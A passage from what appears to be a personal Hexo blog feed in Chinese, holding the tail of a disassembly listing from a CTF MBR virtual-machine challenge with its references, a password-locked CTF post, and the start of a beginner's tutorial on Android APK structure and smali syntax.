dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000c0e: (                    ): sub eax, edx              ; 29d0</span><br><span class="line">00000c10: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c12: (                    ): jmp .+225                 ; e9e1000000</span><br><span class="line">00000c17: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c1e: (                    ): mov edx, dword ptr ds:[eax] ; 8b10</span><br><span class="line">00000c20: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c27: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000c29: (                    ): xor eax, edx              ; 31d0</span><br><span class="line">00000c2b: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c2d: (                    ): jmp .+198                 ; e9c6000000</span><br><span class="line">00000c32: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c39: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c3b: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b0000</span><br><span class="line">00000c42: (                    ): mov cl, al                ; 88c1</span><br><span class="line">00000c44: (                    ): mov eax, dword ptr ds:[edx] ; 8b02</span><br><span class="line">00000c46: (                    ): shl eax, cl               ; d3e0</span><br><span class="line">00000c48: (                    ): mov dword ptr ds:[edx], eax ; 8902</span><br><span class="line">00000c4a: (                    ): jmp .+169                 ; e9a9000000</span><br><span class="line">00000c4f: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c56: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c58: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b0000</span><br><span class="line">00000c5f: (                    ): mov cl, al                ; 88c1</span><br><span class="line">00000c61: (                    ): mov eax, dword ptr ds:[edx] ; 8b02</span><br><span class="line">00000c63: (                    ): shr eax, cl               ; d3e8</span><br><span class="line">00000c65: (                    ): mov dword ptr ds:[edx], eax ; 8902</span><br><span class="line">00000c67: (                    ): jmp .+140                 ; e98c000000</span><br><span class="line">00000c6c: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c73: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c75: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b0000</span><br><span class="line">00000c7c: (                    ): mov edx, dword ptr ds:[ecx] ; 8b11</span><br><span class="line">00000c7e: (                    ): and eax, edx              ; 21d0</span><br><span class="line">00000c80: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c82: (                    ): jmp .+116                 ; eb74</span><br><span class="line">00000c84: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000c8b: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c8d: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000c93: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000c95: (                    ): iret                      ; cf</span><br><span class="line">00000c96: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000c9d: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000c9f: (                    ): test eax, eax             ; 85c0</span><br><span class="line">00000ca1: (                    ): jnz .+85                  ; 7555</span><br><span class="line">00000ca3: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000caa: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000cac: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cb2: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000cb4: (                    ): iret                      ; cf</span><br><span class="line">00000cb5: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b0000</span><br><span class="line">00000cbc: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000cbe: (                    ): test eax, eax             ; 85c0</span><br><span class="line">00000cc0: (                    ): jz .+54                   ; 7436</span><br><span class="line">00000cc2: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b0000</span><br><span class="line">00000cc9: (                    ): mov eax, dword ptr ds:[eax] ; 8b00</span><br><span class="line">00000ccb: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cd1: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000cd3: (                    ): iret                      ; cf</span><br><span class="line">00000cd4: (                    ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f0000</span><br><span class="line">00000cda: (                    ): call .-3061               ; e80bf4ffff</span><br><span class="line">00000cdf: (                    ): hlt                       ; f4</span><br><span class="line">00000ce0: (                    ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f0000</span><br><span class="line">00000ce6: (                    ): call .-3073               ; e8fff3ffff</span><br><span class="line">00000ceb: (                    ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f0000</span><br><span class="line">00000cf1: (                    ): call .-3084               ; e8f4f3ffff</span><br><span class="line">00000cf6: (                    ): hlt                       ; f4</span><br><span class="line">00000cf7: (                    ): hlt                       ; f4</span><br><span class="line">00000cf8: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b0000</span><br><span class="line">00000cfe: (                    ): mov eax, dword ptr ds:[ecx] ; 8b01</span><br><span class="line">00000d00: (                    ): add eax, 0x00000003       ; 83c003</span><br><span class="line">00000d03: (                    ): mov dword ptr ds:[ecx], eax ; 8901</span><br><span class="line">00000d05: (                    ): iret                      ; cf</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-936377-1-1.html</a><br><a href="https://blog.csdn.net/ice__snow/article/details/50654629" target="_blank" rel="noopener">https://blog.csdn.net/ice__snow/article/details/50654629</a><br><a href="https://blog.51cto.com/4201689/1420063" target="_blank" rel="noopener">https://blog.51cto.com/4201689/1420063</a><br><a href="https://www.cnblogs.com/playmak3r/p/12079833.html" target="_blank" rel="noopener">https://www.cnblogs.com/playmak3r/p/12079833.html</a><br><a href="https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/" target="_blank" rel="noopener">https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/</a><br><a href="http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/" target="_blank" rel="noopener">http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/</a><br><a href="https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95" target="_blank" rel="noopener">https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95</a><br><a href="https://mrh1s.top/posts/d2cf12e4/" target="_blank" rel="noopener">https://mrh1s.top/posts/d2cf12e4/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2019-CISCN-BabyBank</title>
    <link href="https://qianfei11.github.io/2020/01/21/2019-CISCN-BabyBank/"/>
    <id>https://qianfei11.github.io/2020/01/21/2019-CISCN-BabyBank/</id>
    <published>2020-01-21T07:08:39.000Z</published>
    <updated>2020-02-09T08:11:00.019Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="23a1d3ff0babd443bc6181e41804ce9eb05d3543acfab3fa1470b5a73f9c7676"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="sol" scheme="https://qianfei11.github.io/tags/sol/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（一）</title>
    <link href="https://qianfei11.github.io/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-01-16T06:41:48.000Z</published>
    <updated>2020-01-25T07:46:26.201Z</updated>
    
    <content type="html"><![CDATA[<p>开始学习安卓。</p><a id="more"></a><h1 id="APK-的组成"><a href="#APK-的组成" class="headerlink" title="APK 的组成"></a>APK 的组成</h1><ul><li>asset 文件夹<ul><li>资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问</li></ul></li><li>lib 文件夹<ul><li>so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中</li></ul></li><li>META-INF 文件夹<ul><li>存放工程的一些属性文件，例如 Manifest.MF</li></ul></li><li>res 文件夹<ul><li>资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用</li></ul></li><li>AndroidManifest.xml<ul><li>Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等）</li></ul></li><li>classes.dex<ul><li>Java 代码编译得到的 Dalvik VM 能直接执行的文件</li></ul></li><li>resources.arsc<ul><li>对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容</li></ul></li><li>其他文件夹</li></ul><p>一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。</p><h1 id="Dalvik-字节码"><a href="#Dalvik-字节码" class="headerlink" title="Dalvik 字节码"></a>Dalvik 字节码</h1><p>Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。</p><h1 id="Smali-文件结构"><a href="#Smali-文件结构" class="headerlink" title="Smali 文件结构"></a>Smali 文件结构</h1><p>Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。</p><p>当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。</p><h2 id="头部定义"><a href="#头部定义" class="headerlink" title="头部定义"></a>头部定义</h2><ul><li><code>.class</code></li><li><code>.super</code></li><li><code>.source</code></li></ul><h2 id="域定义"><a href="#域定义" class="headerlink" title="域定义"></a>域定义</h2><ul><li><code>.field public</code></li><li><code>.field static</code></li><li><code>.field private</code></li><li>…</li></ul><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><h3 id="Smali-函数（使用-P-V-寄存器）"><a href="#Smali-函数（使用-P-V-寄存器）" class="headerlink" title="Smali 函数（使用 P-V 寄存器）"></a>Smali 函数（使用 P-V 寄存器）</h3><p>在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span> 访问修饰符 函数名 函数签名</span><br><span class="line"><span class="keyword">    .locals</span> n <span class="comment"># 使用 n 个寄存器，即 v0~v(n-1)</span></span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"savedInstanceState"</span> <span class="comment"># Landroid/os/Bundle # 注释</span></span><br><span class="line"><span class="keyword">    .</span>.. <span class="comment"># 函数实现</span></span><br><span class="line">   <span class="built_in"> return-xxx </span><span class="comment"># 返回</span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>参数通过寄存器传递（Pn、Vn）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke&#123;参数&#125;, 方法名</span><br></pre></td></tr></table></figure><h2 id="Smali-字段描述符"><a href="#Smali-字段描述符" class="headerlink" title="Smali 字段描述符"></a>Smali 字段描述符</h2><table><thead><tr><th style="text-align:center">Java type</th><th style="text-align:center">Type descriptor</th></tr></thead><tbody><tr><td style="text-align:center"><code>void</code></td><td style="text-align:center"><code>V</code></td></tr><tr><td style="text-align:center"><code>boolean</code></td><td style="text-align:center"><code>Z</code></td></tr><tr><td style="text-align:center"><code>char</code></td><td style="text-align:center"><code>C</code></td></tr><tr><td style="text-align:center"><code>byte</code></td><td style="text-align:center"><code>B</code></td></tr><tr><td style="text-align:center"><code>short</code></td><td style="text-align:center"><code>S</code></td></tr><tr><td style="text-align:center"><code>int</code></td><td style="text-align:center"><code>I</code></td></tr><tr><td style="text-align:center"><code>float</code></td><td style="text-align:center"><code>F</code></td></tr><tr><td style="text-align:center"><code>long</code></td><td style="text-align:center"><code>J</code></td></tr><tr><td style="text-align:center"><code>double</code></td><td style="text-align:center"><code>D</code></td></tr><tr><td style="text-align:center"><code>Object</code></td><td style="text-align:center"><code>Ljava/lang/Object;</code></td></tr><tr><td style="text-align:center"><code>int[]</code></td><td style="text-align:center"><code>[I</code></td></tr><tr><td style="text-align:center"><code>byte[]</code></td><td style="text-align:center"><code>[B</code></td></tr><tr><td style="text-align:center"><code>Object[][]</code></td><td style="text-align:center"><code>[[Ljava/lang/Object;</code></td></tr></tbody></table><h2 id="Smali-基本语法"><a href="#Smali-基本语法" class="headerlink" title="Smali 基本语法"></a>Smali 基本语法</h2><table><thead><tr><th style="text-align:center">Keyword descriptor</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>.field private isFlag:z</code></td><td style="text-align:center">定义变量</td></tr><tr><td style="text-align:center"><code>.method</code></td><td style="text-align:center">方法</td></tr><tr><td style="text-align:center"><code>.parameter</code></td><td style="text-align:center">方法参数</td></tr><tr><td style="text-align:center"><code>.prologue</code></td><td style="text-align:center">方法开始</td></tr><tr><td style="text-align:center"><code>.line 123</code></td><td style="text-align:center">此方法位于第 123 行</td></tr><tr><td style="text-align:center"><code>const/high16 v0, 0x7f03</code></td><td style="text-align:center">把 0x7f03 赋值给 v0</td></tr><tr><td style="text-align:center"><code>return-void</code></td><td style="text-align:center">函数返回 void</td></tr><tr><td style="text-align:center"><code>.end method</code></td><td style="text-align:center">函数结束</td></tr><tr><td style="text-align:center"><code>new-instance</code></td><td style="text-align:center">创建实例</td></tr><tr><td style="text-align:center"><code>iput-object</code></td><td style="text-align:center">对象赋值</td></tr><tr><td style="text-align:center"><code>iget-object</code></td><td style="text-align:center">调用对象</td></tr></tbody></table><p>| <code>move-result-object</code> |<br>| <code>new-array</code> |<br>| <code>array-length</code> |<br>| <code>const/4</code> |<br>| <code>if-ge</code> |<br>| <code>aget-byte</code> |<br>| <code>aput-byte</code> |<br>| <code>rem-int/2addr</code> |<br>| <code>int-to-byte</code> |<br>| <code>goto</code> |<br>| <code>return-object</code> |</p><h2 id="Smali-中函数的调用"><a href="#Smali-中函数的调用" class="headerlink" title="Smali 中函数的调用"></a>Smali 中函数的调用</h2><p>函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。</p><h3 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a><code>invoke-static</code></h3><p>调用静态函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><h3 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a><code>invoke-super</code></h3><p>调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。</p><h3 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a><code>invoke-direct</code></h3><p>调用 private 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</span><br></pre></td></tr></table></figure><h3 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a><code>invoke-virtual</code></h3><p>用于调用 protected 或 public 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;v0,v1&#125;, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><h3 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a><code>invoke-xxxxx/range</code></h3><p>当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 <code>/range</code> 表示范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</span><br></pre></td></tr></table></figure><h2 id="Smali-中的条件跳转分支"><a href="#Smali-中的条件跳转分支" class="headerlink" title="Smali 中的条件跳转分支"></a>Smali 中的条件跳转分支</h2><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>if-eq vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ne vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ge vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-le vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-eqz vA, :cond_**</code></td><td style="text-align:center">如果 vA 等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-nez vA, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ltz vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gez vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gtz vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lez vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 0 则跳转到 <code>:cond_**</code></td></tr></tbody></table><h2 id="Smali-代码编写"><a href="#Smali-代码编写" class="headerlink" title="Smali 代码编写"></a>Smali 代码编写</h2><h3 id="静态返回-HelloWorld-的方法"><a href="#静态返回-HelloWorld-的方法" class="headerlink" title="静态返回 HelloWorld 的方法"></a>静态返回 HelloWorld 的方法</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lf8/helloworld/helloStr;</span> <span class="comment"># 类声明</span></span><br><span class="line"><span class="keyword">    .super</span> <span class="class">Ljava/lang/Object;</span> <span class="comment"># 父类声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .method</span><span class="keyword"> public</span><span class="keyword"> static</span> retHello()<span class="class">Ljava/lang/String;</span> <span class="comment"># 函数声明</span></span><br><span class="line"><span class="keyword">    .locals</span> 1 <span class="comment"># 寄存器数量</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello World from StaticMethod"</span> <span class="comment"># 新建字符串</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0 <span class="comment"># 返回Object类型</span></span><br><span class="line"><span class="keyword">.end method</span> <span class="comment"># 方法结束声明</span></span><br></pre></td></tr></table></figure><h3 id="返回静态-field-的方法"><a href="#返回静态-field-的方法" class="headerlink" title="返回静态 field 的方法"></a>返回静态 field 的方法</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.field</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="keyword"> final</span> hStr:<span class="class">Ljava/lang/String;</span> = <span class="string">"Hello World from static field"</span> <span class="comment"># field声明与初始化</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> retHello2()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> sget-object </span>v0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr:<span class="class">Ljava/lang/String;</span> <span class="comment"># 获取field</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="普通的函数"><a href="#普通的函数" class="headerlink" title="普通的函数"></a>普通的函数</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 0</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> retHello3()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello World from Method"</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="普通的-field-与函数"><a href="#普通的-field-与函数" class="headerlink" title="普通的 field 与函数"></a>普通的 field 与函数</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.field</span><span class="keyword"> public</span> hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello field"</span> <span class="comment"># 初始化非静态field</span></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> retHello4()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><p>调用时需要先初始化一个实例：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Lf8/helloworld/helloStr;</span></span><br><span class="line">invoke-direct &#123;v1&#125;, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">invoke-virtual &#123;v1&#125;, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;retHello3()<span class="class">Ljava/lang/String;</span></span><br><span class="line">move-result-object v1</span><br></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="Android-Log"><a href="#Android-Log" class="headerlink" title="Android Log"></a>Android Log</h3><p>来自于包 <code>android/killer/log</code>。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, <span class="class">Lcom/android/killer/Log;</span>-&gt;LogStr(<span class="class">Ljava/lang/String;</span>)V</span><br></pre></td></tr></table></figure><h3 id="LoadLibrary"><a href="#LoadLibrary" class="headerlink" title="LoadLibrary"></a>LoadLibrary</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, <span class="class">Ljava/lang/System;</span>-&gt;loadLibrary(<span class="class">Ljava/lang/String;</span>)V</span><br></pre></td></tr></table></figure><h3 id="stackTrace"><a href="#stackTrace" class="headerlink" title="stackTrace"></a>stackTrace</h3><p>打印当前函数堆栈，方法为 <code>Thread.dumpStack()</code>。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, <span class="class">Ljava/lang/Thread;</span>-&gt;dumpStack()V</span><br></pre></td></tr></table></figure><h3 id="Method-Trace"><a href="#Method-Trace" class="headerlink" title="Method Trace"></a>Method Trace</h3><p>函数跟踪。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, <span class="class">Landroid/os/Debug;</span>-&gt;startMethodTracing()V</span><br><span class="line">invoke-static &#123;&#125;, <span class="class">Landroid/os/Debug;</span>-&gt;stopMethodTracing()V</span><br></pre></td></tr></table></figure><p>需要添加权限。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span 